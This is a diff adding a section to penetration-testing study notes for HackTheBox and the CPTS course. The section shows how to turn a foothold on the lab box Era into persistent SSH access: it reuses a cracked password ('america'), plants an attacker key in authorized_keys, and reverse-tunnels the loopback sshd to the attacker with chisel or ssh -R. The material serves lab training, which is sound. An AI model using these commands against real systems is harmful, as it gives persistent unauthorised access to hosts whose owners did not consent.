@@ -264,6 +264,66 @@ sudo ./chisel server --reverse -v -p 1234 --socks5
 
 ---
 
+## Scenario — Turn a foothold into a stable SSH shell (localhost-bound sshd)
+
+The single most common privesc-stabilization chain: you have a shell, the box runs SSH, but your external `nmap` says **port 22 is closed/filtered**. It usually isn't off — `sshd` is **bound to `127.0.0.1`** (or firewalled from the VPN), so it's invisible from outside but fully reachable *from the box itself*. Drop a key, tunnel the loopback port back to yourself, and SSH in for a fully-interactive, persistent session — no more fragile reverse shell. This is the shape of HTB **Era** (worked example below).
+
+```mermaid
+flowchart TD
+    A["Foothold shell<br/>(reverse shell / webshell, low-priv user A)"] --> B{"Target account?<br/>need one with a real shell<br/>+ the loot"}
+    B -->|already user B| D
+    B -->|creds reused| C["su user B<br/>(e.g. su eric, password from cracked DB)"]
+    C --> D["Drop YOUR public key<br/>into ~userB/.ssh/authorized_keys"]
+    D --> E{"Is sshd actually listening?<br/>ss -tlnp | grep ':22'"}
+    E -->|"127.0.0.1:22 only"| F["Reverse-tunnel the loopback port<br/>chisel R: / ssh -R / ligolo 240.0.0.1"]
+    E -->|"0.0.0.0:22, just VPN-filtered"| F
+    F --> G["ssh -i yourkey through the tunnel<br/>= stable interactive shell as user B"]
+```
+
+**The chain, step by step (reusable):**
+
+1. **Confirm SSH is really there, just internal.** A closed port on your scan proves nothing — check on-box:
+   ```bash
+   ss -tlnp | grep ':22'          # LISTEN 127.0.0.1:22  → bound to loopback, external scan can't see it
+   ps aux | grep '[s]shd'         # daemon is running
+   ```
+2. **Land on the right account.** You want the user who owns the flag / has a real login shell. If that's not the user you landed as but you have their password (classic: reused from a cracked app DB), `su` to them first:
+   ```bash
+   su eric        # password 'america' reused from the web-app DB
+   ```
+3. **Drop your key** into that user's `authorized_keys` — see [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc#Stabilize First — Drop an SSH Key (no password needed)|Linux Priv Esc → Drop an SSH Key]] for perms/pitfalls (`~/.ssh` 700, `authorized_keys` 600, or sshd silently refuses):
+   ```bash
+   # attacker:  ssh-keygen -t ed25519 -f eric_key -N ''   → copy eric_key.pub
+   mkdir -p ~/.ssh && chmod 700 ~/.ssh
+   echo 'ssh-ed25519 AAAA... attacker' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
+   ```
+4. **Bring loopback:22 back to your box.** Any reverse tunnel works; pick by what the pivot can reach. Reverse-port-forward is cleanest for one service:
+   ```bash
+   # Attacker — chisel reverse server (reverse-proxy port convention: 9001+)
+   sudo ./chisel server --reverse -v -p 9001
+
+   # Pivot (target) — expose ITS 127.0.0.1:22 on the attacker's 127.0.0.1:2222
+   ./chisel client 10.10.14.x:9001 R:2222:127.0.0.1:22
+   ```
+   Or reverse **SOCKS** + proxychains, if you'd rather one proxy for everything (`127.0.0.1` then means the *pivot's* loopback):
+   ```bash
+   sudo ./chisel server --reverse -v -p 9001 --socks5      # attacker
+   ./chisel client 10.10.14.x:9001 R:socks                  # pivot
+   # /etc/proxychains.conf: socks5 127.0.0.1 1080
+   ```
+   Alternatives: `ssh -R 2222:127.0.0.1:22 attacker@10.10.14.x` from the pivot, or ligolo's [[#Reach the pivot's OWN localhost services (240.0.0.1)|240.0.0.1 loopback mapping]].
+5. **SSH in over the tunnel** with your key — a real TTY, survives dropped connections, `sudo`/`su`/`vi` all work, and it doubles as persistence:
+   ```bash
+   ssh -i eric_key -p 2222 eric@127.0.0.1          # port-forward form
+   proxychains ssh -i eric_key eric@127.0.0.1      # reverse-SOCKS form
+   ```
+
+> [!tip] **Why not just `ssh -R` from the pivot and skip chisel?** You can — if the pivot has an `ssh` client and can reach your listener. chisel wins when the pivot's outbound is HTTP-only, when there's no `ssh` binary, or when you want the tunnel to survive independently of a shell. All three routes deliver the same thing: the target's `127.0.0.1:22` on your loopback.
+
+> [!warning] **Key works, session dies instantly?** That's not an auth failure — auth already succeeded (you'd see `Last login:` first). A broken login script (`/etc/profile`, `~/.profile`) under `set -e` is killing the shell. Force a non-login shell: `ssh -i eric_key -p 2222 eric@127.0.0.1 -t 'bash --noprofile --norc'`. Full detail in [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]].
+
+---
+
 ## ligolo-ng
 
 Modern reverse tunneling tool. Creates a TUN interface on the attacker — routed traffic goes directly through the tunnel without proxychains (it builds a userland network stack with gVisor). Much faster than chisel + proxychains for scanning.
@@ -805,5 +865,5 @@ WINDOWS PIVOT
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-08-14*
+*Updated: 2026-08-21*
 *Model: claude-opus-5*
